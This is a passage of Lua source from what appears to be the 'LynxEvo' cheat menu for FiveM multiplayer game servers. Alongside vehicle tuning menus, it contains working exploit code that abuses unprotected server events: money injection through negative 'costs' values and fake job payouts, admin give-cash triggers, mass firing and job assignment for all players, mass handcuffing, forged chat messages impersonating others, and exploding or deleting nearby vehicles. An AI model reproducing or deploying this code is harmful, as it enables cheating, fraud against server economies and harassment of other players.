			if dE.
		id == "extra"
		and# checkValidVehicleExtras()  ~= 0 then
		if LynxEvo.MenuButton(dE.name, dE.id) then end elseif dE.id == "neon"
		then
		if LynxEvo.MenuButton(dE.name, dE.id) then end elseif dE.id == "paint"
		then
		if LynxEvo.MenuButton(dE.name, dE.id) then end elseif dE.id == "wheeltypes"
		then
		if LynxEvo.MenuButton(dE.name, dE.id) then end elseif dE.id == "headlight"
		then
		if LynxEvo.MenuButton(dE.name, dE.id) then end elseif dE.id == "licence"
		then
		if LynxEvo.MenuButton(dE.name, dE.id) then end
		else local az = checkValidVehicleMods(dE.id) for ci, dL in pairs(az) do
			if LynxEvo.MenuButton(dE.name, dE.id) then end;
		break end end end;
		if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
		else xenonStatus = "Not Installed"
		end;
		if LynxEvo.Button("Xenon Headlight", xenonStatus) then
		if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
		else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("performance") then veh = GetVehiclePedIsUsing(PlayerPedId()) for i, dE in pairs(bm) do
			if LynxEvo.
		MenuButton(dE.name, dE.id) then end end;
		if IsToggleModOn(veh, 18) then turboStatus = "Installed"
		else turboStatus = "Not Installed"
		end;
		if LynxEvo.Button("~h~~b~Turbo ~h~Tune", turboStatus) then
		if not IsToggleModOn(veh, 18) then ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
		else ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("primary") then LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic1") LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic1") LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte1") LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal1") LynxEvo.Display() elseif LynxEvo.IsMenuOpened("secondary") then LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic2") LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic2") LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte2") LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal2") LynxEvo.Display() elseif LynxEvo.IsMenuOpened("rimpaint") then LynxEvo.MenuButton("~h~~p~#~s~ Classic", "classic3") LynxEvo.MenuButton("~h~~p~#~s~ Metallic", "metallic3") LynxEvo.MenuButton("~h~~p~#~s~ Matte", "matte3") LynxEvo.MenuButton("~h~~p~#~s~ Metal", "metal3") LynxEvo.Display() elseif LynxEvo.IsMenuOpened("classic1") then
		for dK, em in pairs(br) do tp, ts = GetVehicleColours(veh) if tp ==
		em.id and not bg then pricetext = "Installed"
		else if bg and tp == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = true elseif bg and curprim == em.id then SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = false; bi = -1; bh = -1 elseif bg and curprim ~= em.id then SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metallic1") then
		for dK, em in pairs(br) do tp, ts = GetVehicleColours(veh) if tp ==
		em.id and not bg then pricetext = "Installed"
		else if bg and tp == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = true elseif bg and curprim == em.id then SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = false; bi = -1; bh = -1 elseif bg and curprim ~= em.id then SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("matte1") then
		for dK, em in pairs(bt) do tp, ts = GetVehicleColours(veh) if tp ==
		em.id and not bg then pricetext = "Installed"
		else if bg and tp == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, em.id, oldsec) bg = true elseif bg and curprim == em.id then SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = false; bi = -1; bh = -1 elseif bg and curprim ~= em.id then SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metal1") then
		for dK, em in pairs(bu) do tp, ts = GetVehicleColours(veh) if tp ==
		em.id and not bg then pricetext = "Installed"
		else if bg and tp == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, em.id, oldwheelcolour) SetVehicleColours(veh, em.id, oldsec) bg = true elseif bg and curprim == em.id then SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = false; bi = -1; bh = -1 elseif bg and curprim ~= em.id then SetVehicleColours(veh, em.id, oldsec) SetVehicleExtraColours(veh, em.id, oldwheelcolour) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("classic2") then
		for dK, em in pairs(br) do tp, ts = GetVehicleColours(veh) if ts ==
		em.id and not bg then pricetext = "Installed"
		else if bg and ts == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) bh = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, em.id) bg = true elseif bg and cursec == em.id then SetVehicleColours(veh, oldprim, em.id) bg = false; bi = -1; bh = -1 elseif bg and cursec ~= em.id then SetVehicleColours(veh, oldprim, em.id) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metallic2") then
		for dK, em in pairs(br) do tp, ts = GetVehicleColours(veh) if ts ==
		em.id and not bg then pricetext = "Installed"
		else if bg and ts == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) bh = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, em.id) bg = true elseif bg and cursec == em.id then SetVehicleColours(veh, oldprim, em.id) bg = false; bi = -1; bh = -1 elseif bg and cursec ~= em.id then SetVehicleColours(veh, oldprim, em.id) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("matte2") then
		for dK, em in pairs(bt) do tp, ts = GetVehicleColours(veh) if ts ==
		em.id and not bg then pricetext = "Installed"
		else if bg and ts == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) bh = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, em.id) bg = true elseif bg and cursec == em.id then SetVehicleColours(veh, oldprim, em.id) bg = false; bi = -1; bh = -1 elseif bg and cursec ~= em.id then SetVehicleColours(veh, oldprim, em.id) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metal2") then
		for dK, em in pairs(bu) do tp, ts = GetVehicleColours(veh) if ts ==
		em.id and not bg then pricetext = "Installed"
		else if bg and ts == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; curprim, cursec = GetVehicleColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) bh = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, em.id) bg = true elseif bg and cursec == em.id then SetVehicleColours(veh, oldprim, em.id) bg = false; bi = -1; bh = -1 elseif bg and cursec ~= em.id then SetVehicleColours(veh, oldprim, em.id) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("classic3") then
		for dK, em in pairs(br) do _, ts = GetVehicleExtraColours(veh) if ts ==
		em.id and not bg then pricetext = "Installed"
		else if bg and ts == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; _, currims = GetVehicleExtraColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, em.id) bg = true elseif bg and currims == em.id then SetVehicleExtraColours(veh, oldpearl, em.id) bg = false; bi = -1; bh = -1 elseif bg and currims ~= em.id then SetVehicleExtraColours(veh, oldpearl, em.id) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metallic3") then
		for dK, em in pairs(br) do _, ts = GetVehicleExtraColours(veh) if ts ==
		em.id and not bg then pricetext = "Installed"
		else if bg and ts == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; _, currims = GetVehicleExtraColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, em.id) bg = true elseif bg and currims == em.id then SetVehicleExtraColours(veh, oldpearl, em.id) bg = false; bi = -1; bh = -1 elseif bg and currims ~= em.id then SetVehicleExtraColours(veh, oldpearl, em.id) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("matte3") then
		for dK, em in pairs(bt) do _, ts = GetVehicleExtraColours(veh) if ts ==
		em.id and not bg then pricetext = "Installed"
		else if bg and ts == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; _, currims = GetVehicleExtraColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, em.id) bg = true elseif bg and currims == em.id then SetVehicleExtraColours(veh, oldpearl, em.id) bg = false; bi = -1; bh = -1 elseif bg and currims ~= em.id then SetVehicleExtraColours(veh, oldpearl, em.id) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("metal3") then
		for dK, em in pairs(bu) do _, ts = GetVehicleExtraColours(veh) if ts ==
		em.id and not bg then pricetext = "Installed"
		else if bg and ts == em.id then pricetext = "Previewing"
		else pricetext = "Not Installed"
		end end; _, currims = GetVehicleExtraColours(veh) if LynxEvo.Button(em.name, pricetext) then
		if not bg then bi = "paint"
		bk = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, em.id) bg = true elseif bg and currims == em.id then SetVehicleExtraColours(veh, oldpearl, em.id) bg = false; bi = -1; bh = -1 elseif bg and currims ~= em.id then SetVehicleExtraColours(veh, oldpearl, em.id) bg = true end end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("VehicleMenu") then
		if LynxEvo.MenuButton("~h~~p~#~s~ ~h~~b~LSC ~s~Customs", "LSC") then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle ~g~Boost", 'BoostMenu') then elseif LynxEvo.MenuButton("~h~~p~#~s~ Vehicle List", 'CarTypes') then elseif LynxEvo.MenuButton("~h~~p~#~s~ Global Car Trolls", 'GCT') then elseif LynxEvo.MenuButton("~h~~p~#~s~ Spawn & Attach ~s~Trailer", "MainTrailer") then elseif LynxEvo.Button("~h~Spawn ~r~Custom ~s~Vehicle") then ca() elseif LynxEvo.Button("~h~~r~Delete ~s~Vehicle") then DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif LynxEvo.Button("~h~~g~Repair ~s~Vehicle") then cc() elseif LynxEvo.Button("~h~~g~Repair ~s~Engine") then cd() elseif LynxEvo.Button("~h~~g~Flip ~s~Vehicle") then daojosdinpatpemata() elseif LynxEvo.Button("~h~~b~Max ~s~Tuning") then MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1))) elseif LynxEvo.Button("~h~~g~RC ~s~Car") then ce() LynxEvo.CloseMenu() elseif LynxEvo.CheckBox("~h~No Fall", Nofall, function(dR) Nofall = dR; SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall) end) then elseif LynxEvo.CheckBox("~h~Vehicle Godmode", VehGod, function(dR) VehGod = dR end) then elseif LynxEvo.CheckBox("~h~Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(dR) VehSpeed = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("GCT") then
		if LynxEvo.CheckBox("~h~~r~EMP~s~ Nearest Vehicles", destroyvehicles, function(dR) destroyvehicles = dR end) then elseif LynxEvo.CheckBox("~h~~r~Delete~s~ Nearest Vehicles/Entity", deletenearestvehicle, function(dR) deletenearestvehicle = dR end) then elseif LynxEvo.CheckBox("~h~~r~Explode~s~ Nearest Vehicles", explodevehicles, function(dR) explodevehicles = dR end) then elseif LynxEvo.CheckBox("~h~~p~Fuck~s~ Nearest Vehicles", fuckallcars, function(dR) fuckallcars = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("LuaMenu") then
		if LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Boss", "ESXBoss") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Money", "ESXMoney") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Jobs", "ESXJobs") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Misc", "ESXCustom") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~r~ESX ~s~Drugs", "ESXDrugs") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~y~VRP ~s~Triggers", "VRPTriggers") then elseif LynxEvo.MenuButton("~h~~p~#~s~ ~b~Misc ~s~Triggers", "MiscTriggers") then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXJobs") then
		if LynxEvo.Button("~h~Fire all players") then
		for ak = 0, 128 do TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(ak)) UnemployedPlayers() end elseif LynxEvo.Button("~h~Set all ~b~Police ~s~Job") then
		for
		ak = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(ak), "police", 3) PolicePlayers() end elseif LynxEvo.Button("~h~Set all ~o~Mecano ~s~Job") then
		for
		ak = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(ak), "mecano", 3) MecanoPlayers() end elseif LynxEvo.Button("~h~Set all ~y~Taxi ~s~Job") then
		for
		ak = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(ak), "taxi", 3) TaxiPlayers() end elseif LynxEvo.Button("~h~Set all ~r~Ambulance ~s~Job") then
		for
		ak = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(ak), "ambulance", 3) AmbulancePlayers() end elseif LynxEvo.Button("~h~Set all ~g~Real Estate ~s~Job") then
		for
		ak = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(ak), "realestateagent", 3) RealEstateAgentPlayers() end elseif LynxEvo.Button("~h~Set all ~r~Car ~b~Dealer ~s~Job") then
		for
		ak = 0, 128 do TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(ak), "cardealer", 3) CarDealerPlayers() end end;
		LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXBoss") then
		if LynxEvo.Button("~c~~h~Mechanic~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'mecano', function(en, eo) eo.close() end) TriggerEvent("esx_society:openBossMenu", "mecano", function(en, eo) eo.close() end) TriggerEvent("esx_society:openBossMenu", 'mecano', function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", "mecano", function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", 'mecano', function(er, es) es.close() end) TriggerEvent("esx_society:openBossMenu", "mecano", function(er, es) es.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~b~~h~Police~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'police', function(en, eo) eo.close() end) TriggerEvent("esx_society:openBossMenu", "police", function(en, eo) eo.close() end) TriggerEvent("esx_society:openBossMenu", 'police', function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", "police", function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", 'police', function(er, es) es.close() end) TriggerEvent("esx_society:openBossMenu", "police", function(er, es) es.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~r~~h~Ambulance~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'ambulance', function(en, eo) eo.close() end) TriggerEvent("esx_society:openBossMenu", "ambulance", function(en, eo) eo.close() end) TriggerEvent("esx_society:openBossMenu", 'ambulance', function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", "ambulance", function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", 'ambulance', function(er, es) es.close() end) TriggerEvent("esx_society:openBossMenu", "ambulance", function(er, es) es.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~y~~h~Taxi~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'taxi', function(en, eo) eo.close() end) TriggerEvent("esx_society:openBossMenu", "taxi", function(en, eo) eo.close() end) TriggerEvent("esx_society:openBossMenu", 'taxi', function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", "taxi", function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", 'taxi', function(er, es) es.close() end) TriggerEvent("esx_society:openBossMenu", "taxi", function(er, es) es.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~g~~h~Real Estate~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(en, eo) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "realestateagent", function(en, eo) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", "realestateagent", function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", 'realestateagent', function(er, es) es.close() end) TriggerEvent("esx_society:openBossMenu", "realestateagent", function(er, es) es.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~o~~h~Car Dealer~s~ Boss Menu") then TriggerEvent("esx_society:openBossMenu", 'cardealer', function(en, eo) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", "cardealer", function(en, eo) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", 'cardealer', function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", "cardealer", function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", 'cardealer', function(er, es) es.close() end) TriggerEvent("esx_society:openBossMenu", "cardealer", function(er, es) es.close() end) LynxEvo.CloseMenu() elseif LynxEvo.Button("~y~~h~Custom~s~ Boss Menu") then local m = KeyboardInput("Enter custom boss menu job name", "", 100) if m ~= ""
		then TriggerEvent("esx_society:openBossMenu", m, function(en, eo) LynxEvo.close() end) TriggerEvent("esx_society:openBossMenu", m, function(ep, eq) eq.close() end) TriggerEvent("esx_society:openBossMenu", m, function(er, es) es.close() end) LynxEvo.CloseMenu() end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXMoney") then
		if LynxEvo.Button("~h~~o~Automatic Money ~r~ WARNING!") then automaticmoneyesx() elseif LynxEvo.Button("~g~~h~ESX ~y~Caution Give Back") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_jobs:caution", "give_back", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Eden Garage") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("eden_garage:payhealth", {
			costs = -m
		}) end elseif LynxEvo.Button("~g~~h~ESX ~y~Fuel Delivery") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_fueldelivery:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Car Thief") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_carthief:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~DMV School") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_dmvschool:pay", {
			costs = -m
		}) end elseif LynxEvo.Button("~g~~h~FUEL ~y~Legacy Fuel") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("LegacyFuel:PayFuel", {
			costs = -m
		}) end elseif LynxEvo.Button("~g~~h~ESX ~y~Dirty Job") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_godirtyjob:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Pizza Boy") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_pizza:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Ranger Job") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_ranger:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Garbage Job") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_garbagejob:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY") then local m = KeyboardInput("Enter amount of dirty money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_carthief:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Trucker Job") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_truckerjob:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Admin Give Bank") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("AdminMenu:giveBank", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Admin Give Cash") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("AdminMenu:giveCash", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Postal Job") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_gopostaljob:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Banker Job") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_banksecurity:pay", m) end elseif LynxEvo.Button("~g~~h~ESX ~y~Slot Machine") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("esx_slotmachine:sv:2", m) end elseif LynxEvo.CheckBox("~g~~h~ESX Hunting~y~ reward", huntspam, function(dR) huntspam = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXCustom") then
		if LynxEvo.Button("~w~~h~Set hunger to ~h~~g~100") then TriggerEvent("esx_status:set", "hunger", 1000000) elseif LynxEvo.Button("~w~~h~Set thirst to ~h~~g~100") then TriggerEvent("esx_status:set", "thirst", 1000000) elseif LynxEvo.Button("~g~~h~ESX ~r~Revive") then local f = KeyboardInput("Enter Player ID or all", "", 1000) if f then
		if f == "all"
		then
		for i = 0, 128 do TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i)) TriggerEvent("esx_ambulancejob:revive", GetPlayerServerId(i)) end
		else TriggerEvent("esx_ambulancejob:revive", f) TriggerEvent("esx_ambulancejob:revive", f) end end elseif LynxEvo.Button("~g~~h~ESX ~b~Handcuff") then local f = KeyboardInput("Enter Player ID or all", "", 1000) if f
		then
		if f == "all"
		then
		for i = 0, 128 do TriggerServerEvent("esx_policejob:handcuff", GetPlayerServerId(i)) TriggerEvent("esx_policejob:handcuff", GetPlayerServerId(i)) end
		else TriggerEvent("esx_policejob:handcuff", f) TriggerServerEvent("esx_policejob:handcuff", f) end end elseif LynxEvo.Button("~h~Get Driving License") then TriggerServerEvent("esx_dmvschool:addLicense", 'dmv') TriggerServerEvent("esx_dmvschool:addLicense", 'drive') elseif LynxEvo.Button("~h~~b~Buy ~s~a vehicle for ~g~free") then cv() end;
		LynxEvo.Display() elseif LynxEvo.IsMenuOpened("ESXDrugs") then
		if LynxEvo.Button("~h~~g~Harvest ~g~Weed") then hweed() elseif LynxEvo.Button("~h~~g~Transform ~g~Weed") then tweed() elseif LynxEvo.Button("~h~~g~Sell ~g~Weed") then sweed() elseif LynxEvo.Button("~h~~w~Harvest ~w~Coke") then hcoke() elseif LynxEvo.Button("~h~~w~Transform ~w~Coke") then tcoke() elseif LynxEvo.Button("~h~~w~Sell ~w~Coke") then scoke() elseif LynxEvo.Button("~h~~r~Harvest Meth") then hmeth() elseif LynxEvo.Button("~h~~r~Transform Meth") then tmeth() elseif LynxEvo.Button("~h~~r~Sell Meth") then smeth() elseif LynxEvo.Button("~h~~p~Harvest Opium") then hopi() elseif LynxEvo.Button("~h~~p~Transform Opium") then topi() elseif LynxEvo.Button("~h~~p~Sell Opium") then sopi() elseif LynxEvo.Button("~h~~g~Money Wash") then mataaspalarufe() elseif LynxEvo.Button("~r~~h~Stop all") then matanumaispalarufe() elseif LynxEvo.CheckBox("~h~~r~Blow Drugs Up ~y~DANGER!", BlowDrugsUp, function(dR) BlowDrugsUp = dR end) then end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("VRPTriggers") then
		if LynxEvo.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("lscustoms:payGarage", {
			costs = -m
		}) end elseif LynxEvo.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("vrp_slotmachine:server:2", m) end elseif LynxEvo.Button("~g~~h~FUEL ~y~Legacy Fuel") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("LegacyFuel:PayFuel", {
			costs = -m
		}) end elseif LynxEvo.Button("~r~~h~VRP ~s~Get driving license") then TriggerServerEvent("dmv:success") elseif LynxEvo.Button("~r~~h~VRP ~s~Bank Deposit") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("Banca:deposit", m) TriggerServerEvent("bank:deposit", m) end elseif LynxEvo.Button("~r~~h~VRP ~s~Bank Withdraw ") then local m = KeyboardInput("Enter amount of money", "", 100) if m ~= ""
		then TriggerServerEvent("bank:withdraw", m) TriggerServerEvent("Banca:withdraw", m) end end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("MiscTriggers") then
		if LynxEvo.Button("~h~Send Discord Message") then local et = KeyboardInput("Enter message to send", "", 100) TriggerServerEvent("DiscordBot:playerDied", et, "1337") av("The message:~n~"..et..
			"~n~Has been ~g~sent!", true) elseif LynxEvo.Button("~h~Send Fake Message") then local eu = KeyboardInput("Enter player name", "", 100) if eu then local db = KeyboardInput("Enter message", "", 1000) if db then TriggerServerEvent("_chat:messageEntered", eu, {
			0, 0x99, 255
		}, db) end end elseif LynxEvo.Button("~h~~g~ESX ~y~CarThief ~s~TROLL") then av("~y~esx_carthief ~g~required", true) av("~g~Trying to send alerts", false) carthieftroll() end; LynxEvo.Display() elseif LynxEvo.IsMenuOpened("AdvM") then
